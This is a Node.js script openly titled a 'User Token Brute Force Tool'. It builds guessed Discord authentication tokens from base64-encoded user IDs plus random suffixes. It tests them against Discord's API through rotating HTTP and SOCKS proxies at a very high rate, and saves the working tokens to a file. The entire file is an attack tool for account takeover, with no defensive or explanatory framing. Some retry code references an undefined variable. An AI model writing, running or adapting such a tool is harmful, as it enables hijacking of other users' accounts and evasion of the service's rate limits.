const request = require('request');
const chalk = require('chalk');
const fs = require('fs');
const prompt = require('prompt');
var RandExp = require('randexp');
const ProxyAgent = require('proxy-agent');
var proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n');
var ID = fs.readFileSync('ids.txt', 'utf-8').replace(/\r/gi, '').split('\n');
var work = 0;
var invalid = 0;
var failed = 0;
var triesPerSecond = 10000;
process.on('uncaughtException', err => { });
process.on('unhandledRejection', err => { });
process.warn = () => { };

codegen = function () {
	var ids = ID[Math.floor(Math.random() * ID.length)];
	let data = ids;
	let buff = Buffer.from(data);
	let base64data = buff.toString('base64');
	tokenstart = base64data;
	var end = new RandExp(/^[A-Z]{1}([a-zA-Z0-9]){5}\.([a-zA-Z0-9_-]{27})$/).gen();
	token = tokenstart + "." + end;
	return token
}
function write(content, file) {
    fs.appendFile(file, content, function(err) {
    });
}		
function check(token,type){	
	var proxy = proxies[Math.floor(Math.random() * proxies.length)];
	var agent = new ProxyAgent(`${type}://${proxy}`);
	request({
		method: "GET",
		url: `https://discord.com/api/v9/users/@me/guilds`, 
		agent, 
		json: true,
		timeout: 2500,
		headers: {
			"Content-Type": "application/json",
			authorization: token,
		}						
	}, (err, res, body) => {
		switch(res.statusCode){
			case 200:
				work++;
				console.log(chalk.green('[200] Working Token | %s |  %s' ),token , proxy);
				write(token + "\n", "tokens/working.txt");
				break;
			case 401: 
				invalid++;
				console.log(chalk.red(`[401] (${invalid}) | Invalid Token | %s |  %s` ), token, proxy );
				write(token + "\n", "tokens/invalid.txt");
				break
			case 429:
				console.log(chalk.yellow(`[429] | Rate Limits`));
				check(code);
				break;
			default:
				check(code);
				break;
		}
		process.title = `[313][Token Generator] | Invalid Tokens ${invalid} | Working ${work} | Total Proxies: ${proxies.length} `;
	});
}
process.title = `[313][Token Generator] | Invalid Tokens ${invalid} | Working ${work} | Total Proxies: ${proxies.length} `;
console.log(chalk.inverse("User Token Brute Force Tool using UserIDs"));
console.log("")
prompt.start();	
console.log(chalk.inverse("[INFO] Press Corrosponding Number to Select Proxy Type to Start! ")); 
console.log(`[1] https
[2] socks4
[3] socks5`); 
			prompt.get(['type'], function(err, result) {
			console.log('');
			var type = result.type;
			switch(type) {
				case "1": 
					var type = "http";
					break
				case "2":
					var type = "socks4";
					break
				case "3":
					var type = "socks5";
					break
				default:
					var type = "http";
					break
			}
console.log("Starting...");
check(codegen(),type);
setInterval(() => {
    check(codegen(),type);
}, (1/triesPerSecond) * 10);

			})
